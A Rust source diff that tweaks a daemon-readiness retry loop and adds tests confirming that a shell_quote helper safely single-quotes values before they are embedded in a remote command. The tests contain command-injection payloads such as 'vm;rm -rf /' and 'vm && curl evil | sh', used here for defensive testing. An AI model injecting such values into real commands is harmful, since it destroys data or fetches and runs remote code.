@@ -522,11 +522,18 @@ fn wait_for_daemon(endpoint: &str, clock: &dyn Clock) -> OpResult<()> {
         .to_socket_addrs()
         .map(|a| a.collect())
         .unwrap_or_default();
-    for _ in 0..50 {
+    const ATTEMPTS: u32 = 50;
+    for attempt in 0..ATTEMPTS {
         if addrs.iter().any(|a| TcpStream::connect(a).is_ok()) {
             return Ok(());
         }
-        clock.sleep(std::time::Duration::from_millis(200));
+        // Sleep only *between* attempts, never after the final one: a daemon
+        // that never comes up must surface the error immediately rather than
+        // paying one last idle 200ms poll interval. Uses the injected clock so
+        // tests can drive readiness without real wall-clock delay.
+        if attempt + 1 < ATTEMPTS {
+            clock.sleep(std::time::Duration::from_millis(200));
+        }
     }
     Err(SignalOpError::Daemon(format!(
         "daemon did not become reachable on {endpoint}"
@@ -661,4 +668,83 @@ fn systemd_user_available() -> bool {
 /// Single-quote a value for safe embedding in the remote shell command.
 fn shell_quote(s: &str) -> String {
     format!("'{}'", s.replace('\'', "'\\''"))
+}
+
+#[cfg(test)]
+mod shell_quote_tests {
+    //! TDD contract — SR1 command-string injection defense.
+    //!
+    //! The fleet onboarding path builds a remote command string that azlin runs
+    //! under a shell: `azlin connect <vm> ... -- "amplihack signal setup
+    //! --endpoint <ep> --device-name amplihack-<vm>"`. The `<ep>` and `<vm>`
+    //! interpolations are POSIX single-quoted by [`shell_quote`] so that even if
+    //! a value slipped past the upstream allowlist validators, it cannot break
+    //! out of its quotes and inject additional shell words/commands.
+    //!
+    //! Invariants locked here:
+    //!   * Output is ALWAYS wrapped in a single-quoted string (never bare).
+    //!   * The ONLY transformation inside is the canonical `'\''` escape for a
+    //!     literal single quote — the reversible POSIX idiom.
+    //!   * Shell metacharacters (`;`, `&`, `|`, `$()`, backticks, newlines,
+    //!     spaces, redirections) are inert: they appear only as literal bytes
+    //!     between the wrapping quotes, never as unquoted shell syntax.
+    use super::shell_quote;
+
+    #[test]
+    fn wraps_plain_values_in_single_quotes() {
+        assert_eq!(shell_quote("ia2"), "'ia2'");
+        assert_eq!(shell_quote("127.0.0.1:7583"), "'127.0.0.1:7583'");
+        assert_eq!(shell_quote(""), "''");
+    }
+
+    #[test]
+    fn escapes_embedded_single_quotes_reversibly() {
+        // The canonical POSIX idiom: close-quote, escaped-quote, re-open-quote.
+        assert_eq!(shell_quote("a'b"), "'a'\\''b'");
+        assert_eq!(shell_quote("'"), "''\\'''");
+    }
+
+    #[test]
+    fn injection_payloads_stay_fully_quoted() {
+        // Each payload must be a SINGLE quoted token: start and end with `'`,
+        // and contain no *unescaped* `'` that could terminate the quote early.
+        for payload in [
+            "vm;rm -rf /",
+            "vm && curl evil | sh",
+            "vm$(id)",
+            "vm`whoami`",
+            "vm\nwhoami",
+            "vm > /etc/passwd",
+            "a'; rm -rf / #",
+        ] {
+            let q = shell_quote(payload);
+            assert!(
+                q.starts_with('\'') && q.ends_with('\''),
+                "must be quoted: {q}"
+            );
+            // Every literal single quote in the input must be encoded as the
+            // 4-char `'\''` sequence; no other `'` may appear unescaped.
+            assert_eq!(
+                q.matches('\'').count(),
+                2 + payload.matches('\'').count() * 3,
+                "unbalanced/leaky quoting for {payload:?} -> {q}"
+            );
+        }
+    }
+
+    #[test]
+    fn onboarding_command_is_a_well_formed_single_string() {
+        // Mirrors the exact interpolation in `onboard_remote_vm`.
+        let endpoint = "127.0.0.1:7583";
+        let vm = "web-01";
+        let remote_cmd = format!(
+            "amplihack signal setup --endpoint {} --device-name amplihack-{}",
+            shell_quote(endpoint),
+            shell_quote(vm)
+        );
+        assert_eq!(
+            remote_cmd,
+            "amplihack signal setup --endpoint '127.0.0.1:7583' --device-name amplihack-'web-01'"
+        );
+    }
 }
